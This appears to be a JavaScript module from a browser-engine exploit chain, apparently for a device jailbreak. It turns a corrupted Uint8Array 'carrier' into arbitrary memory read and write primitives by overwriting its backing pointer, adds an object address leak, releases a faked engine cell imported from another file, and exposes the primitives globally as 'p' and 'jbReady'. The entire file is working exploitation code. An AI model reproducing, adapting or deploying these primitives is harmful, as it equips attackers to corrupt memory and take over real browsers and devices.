import { int64 } from "./int64.js";
import { carrierHomeVector, releaseFakeCell } from "./core.js?v=final";

let carrier = null;
let originalVector = NaN;
let leakSlotAddress = NaN;
let leakSetter = null;
let leakClearer = null;

const pairStatus = {
  promoted: false,
  released: false,
  error: ""
};

function toAddressNumber(address) {
  if (address instanceof int64)
    return address.low + address.hi * 0x100000000;
  if (typeof address === "number" && Number.isFinite(address))
    return address;
  if (address && typeof address.low === "number" && typeof address.hi === "number")
    return (address.low >>> 0) + (address.hi >>> 0) * 0x100000000;
  throw new TypeError("invalid address");
}

function toInt64Address(address) {
  if (address instanceof int64)
    return address;
  const value = toAddressNumber(address);
  const hi = Math.floor(value / 0x100000000);
  return new int64((value - hi * 0x100000000) >>> 0, hi >>> 0);
}

function writeAddressBytes(view, address) {
  const value = toAddressNumber(address);
  const hi = Math.floor(value / 0x100000000);
  const lo = value - hi * 0x100000000;
  view[0x10] = lo & 0xff;
  view[0x11] = (lo >>> 8) & 0xff;
  view[0x12] = (lo >>> 16) & 0xff;
  view[0x13] = (lo >>> 24) & 0xff;
  view[0x14] = hi & 0xff;
  view[0x15] = (hi >>> 8) & 0xff;
  view[0x16] = (hi >>> 16) & 0xff;
  view[0x17] = (hi >>> 24) & 0xff;
}

function initCarrier(view, origVec, leakAddr = NaN, setLeak = null, clearLeak = null) {
  if (!(view instanceof Uint8Array))
    throw new TypeError("carrier view must be a Uint8Array");
  carrier = view;
  originalVector = toAddressNumber(origVec);
  leakSlotAddress = Number.isFinite(leakAddr) ? toAddressNumber(leakAddr) : NaN;
  leakSetter = typeof setLeak === "function" ? setLeak : null;
  leakClearer = typeof clearLeak === "function" ? clearLeak : null;
}

function aim(address) {
  if (!carrier) throw new Error("Carrier not initialized");
  writeAddressBytes(carrier, address);
}

function restore() {
  if (!carrier || !Number.isFinite(originalVector))
    throw new Error("Cannot restore carrier");
  aim(originalVector);
}

function read1(addr) {
  aim(addr);
  return carrier[0];
}

function read2(addr) {
  aim(addr);
  return carrier[0] + (carrier[1] << 8);
}

function read4(addr) {
  aim(addr);
  return (carrier[0]
    + (carrier[1] << 8)
    + (carrier[2] << 16)
    + (carrier[3] << 24)) >>> 0;
}

function read8(addr) {
  aim(addr);
  const low = (carrier[0]
    + (carrier[1] << 8)
    + (carrier[2] << 16)
    + (carrier[3] << 24)) >>> 0;
  const high = (carrier[4]
    + (carrier[5] << 8)
    + (carrier[6] << 16)
    + (carrier[7] << 24)) >>> 0;
  return new int64(low, high);
}

function write1(addr, value) {
  aim(addr);
  carrier[0] = value & 0xff;
}

function write2(addr, value) {
  aim(addr);
  carrier[0] = value & 0xff;
  carrier[1] = (value >>> 8) & 0xff;
}

function write4(addr, value) {
  aim(addr);
  value = value >>> 0;
  carrier[0] = value & 0xff;
  carrier[1] = (value >>> 8) & 0xff;
  carrier[2] = (value >>> 16) & 0xff;
  carrier[3] = (value >>> 24) & 0xff;
}

function write8(addr, value) {
  aim(addr);
  const v = toInt64Address(value);
  carrier[0] = v.low & 0xff;
  carrier[1] = (v.low >>> 8) & 0xff;
  carrier[2] = (v.low >>> 16) & 0xff;
  carrier[3] = (v.low >>> 24) & 0xff;
  carrier[4] = v.hi & 0xff;
  carrier[5] = (v.hi >>> 8) & 0xff;
  carrier[6] = (v.hi >>> 16) & 0xff;
  carrier[7] = (v.hi >>> 24) & 0xff;
}

function leakval(obj) {
  if (!Number.isFinite(leakSlotAddress) || !leakSetter || !leakClearer)
    throw new Error("leakval: address leak not available");
  leakSetter(obj);
  try {
    return read8(leakSlotAddress);
  } finally {
    leakClearer();
    restore();
  }
}

function assertHome() {
  if (!carrier) return false;
  return carrier[0] === 0x3c;
}

function buildWindowP() {
  return {
    aim,
    restore,
    read1,
    read2,
    read4,
    read8,
    write1,
    write2,
    write4,
    write8,
    leakval,
    assertHome
  };
}

function installWindowP(coreCarrier, options = {}) {
  pairStatus.promoted = false;
  pairStatus.released = false;
  pairStatus.error = "";

  try {
    if (!coreCarrier || typeof coreCarrier !== "object")
      throw new TypeError("carrier is required");
    if (!(coreCarrier.view instanceof Uint8Array))
      throw new TypeError("carrier view is unavailable");

    initCarrier(
      coreCarrier.view,
      carrierHomeVector(),
      coreCarrier.leakSlotAddress,
      coreCarrier.setLeakSlot,
      coreCarrier.clearLeakSlot
    );

    const p = buildWindowP();
    globalThis.p = p;
    globalThis.leakAddress = leakval;
    globalThis.jbReady = Promise.resolve(p);

    const released = releaseFakeCell();
    pairStatus.promoted = true;
    pairStatus.released = !!(released && (released.alreadyReleased || released.released));

    const onEvent = typeof options.onEvent === "function" ? options.onEvent : null;
    if (onEvent)
      onEvent("WINDOW-P-READY", "released=" + (pairStatus.released ? "1" : "0"));

    return p;
  } catch (error) {
    pairStatus.error = error && error.message ? error.message : String(error);
    throw error;
  }
}

export {
  pairStatus,
  installWindowP,
  initCarrier,
  aim,
  restore,
  read1, read2, read4, read8,
  write1, write2, write4, write8,
  leakval,
  assertHome
};
